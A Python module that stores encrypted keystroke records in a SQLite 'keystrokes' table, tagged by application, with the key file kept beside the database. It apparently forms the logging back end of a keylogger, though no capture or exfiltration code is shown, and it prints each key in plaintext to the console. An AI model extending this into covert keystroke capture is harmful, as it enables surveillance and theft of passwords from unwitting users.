import sqlite3
import os
from cryptography.fernet import Fernet

# --- Encryption ---
def load_key():
    """Load or generate AES encryption key."""
    if not os.path.exists("secret.key"):
        key = Fernet.generate_key()
        with open("secret.key", "wb") as key_file:
            key_file.write(key)
    else:
        with open("secret.key", "rb") as key_file:
            key = key_file.read()
    return Fernet(key)

cipher = load_key()

# --- Database Setup ---
def init_db():
    """Initialize the SQLite database and create table if not exists."""
    conn = sqlite3.connect("logs.db")
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS keystrokes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        application TEXT,
        key TEXT
    )
    """)
    conn.commit()
    conn.close()
    print("[INFO] Database initialized successfully.")

def insert_log(timestamp, application, key):
    """Insert an encrypted log entry into SQLite DB."""
    conn = sqlite3.connect("logs.db")
    cursor = conn.cursor()
    try:
        encrypted_key = cipher.encrypt(key.encode())
        cursor.execute(
            "INSERT INTO keystrokes (timestamp, application, key) VALUES (?, ?, ?)",
            (timestamp, application, encrypted_key.decode())
        )
        conn.commit()
        print(f"[DB] Inserted log: {application} | {key}")
    except Exception as e:
        print("[DB ERROR]", e)
    finally:
        conn.close()
